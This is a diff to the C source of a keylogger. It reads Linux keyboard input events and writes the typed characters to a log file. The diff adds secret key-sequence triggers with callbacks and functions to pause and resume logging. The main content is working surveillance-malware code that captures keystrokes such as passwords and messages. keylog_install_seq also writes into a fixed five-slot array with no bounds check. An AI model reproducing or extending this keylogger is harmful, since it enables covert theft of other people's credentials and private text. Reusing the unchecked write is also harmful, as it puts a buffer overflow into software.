@@ -1,5 +1,6 @@
 #include <errno.h>
 #include <fcntl.h>      /* for open */
+#include <stdbool.h>    /* for bool */
 #include <stdlib.h>     /* for malloc */
 #include <string.h>     /* for strerror */
 #include <sys/stat.h>   /* for mode */
@@ -10,8 +11,18 @@
 #include "logger.h"
 
 #define BUFFSIZE 255
+#define MAX_KEY_SEQ 5
+
+enum ev_value {
+    RELEASED,
+    PRESSED,
+    REPEATED,
+};
 
 struct priv {
+    keyseq_t seq_list[MAX_KEY_SEQ]; /* hard code for now */
+    int num_seq;
+
     struct {
         int fd; /* file descriptor */
         mode_t mode;
@@ -69,9 +80,43 @@ static int keylog_close(keylog_t *kl)
     return OK;
 }
 
+static bool has_seq_triggered(unsigned short ev_code,
+                              keyseq_t *seq)
+{
+    bool seq_triggered = false;
+
+    if (ev_code == seq->keys[seq->index]) {
+        seq->index++;
+
+        if (seq->index == seq->size) {
+            seq->index = 0;
+            seq_triggered = true;
+        }
+    } else {
+        seq->index = 0;
+    }
+
+    return seq_triggered;
+}
+
+/*
+ * Structure definition:
+ *
+ * struct input_event {
+ *    struct timeval time;
+ *    unsigned short type;
+ *    unsigned short code;
+ *    unsigned int value;
+ * }
+ */
+
 static void keylog_log(keylog_t *kl, struct input_event e)
 {
     struct priv *priv = (struct priv *) kl->priv;
+
+    if (!kl->logging_enabled) {
+        return;
+    }
 
     char c;
     unsigned short code = e.code;
@@ -137,6 +182,38 @@ static void keylog_log(keylog_t *kl, struct input_event e)
     write(priv->log.fd, &c, 1);
 }
 
+void keylog_process_event(keylog_t *kl, struct input_event e)
+{
+    struct priv *priv = (struct priv *) kl->priv;
+
+    if (e.type == EV_KEY && e.value == RELEASED) {
+        keylog_log(kl, e);
+
+        for (int k = 0; k < priv->num_seq; k++) {
+            if (has_seq_triggered(e.code, &priv->seq_list[k])) {
+                priv->seq_list[k].callback(kl);
+            }
+        }
+    }
+}
+
+void keylog_install_seq(keylog_t *kl, keyseq_t seq)
+{
+    struct priv *priv = (struct priv *) kl->priv;
+
+    priv->seq_list[priv->num_seq++] = seq;
+}
+
+void keylog_pause(keylog_t *kl)
+{
+    kl->logging_enabled = false;
+}
+
+void keylog_resume(keylog_t *kl)
+{
+    kl->logging_enabled = true;
+}
+
 keylog_t *create_keylog(const cmd_args_t cmd_args)
 {
     keylog_t *kl;
@@ -147,11 +224,19 @@ keylog_t *create_keylog(const cmd_args_t cmd_args)
 
     kl->open = keylog_open;
     kl->close = keylog_close;
-    kl->log = keylog_log;
+    kl->process_event = keylog_process_event;
+    kl->install_seq = keylog_install_seq;
+
+    kl->pause = keylog_pause;
+    kl->resume = keylog_resume;
 
     priv->log.flags = cmd_args.keylog.flags;
     priv->log.mode = cmd_args.keylog.mode;
     strncpy(priv->log.name, cmd_args.keylog.filename, KEY_LOG_LEN);
+
+    priv->num_seq = 0;
+
+    kl->logging_enabled = true;
 
     kl->priv = (void *) priv;
 
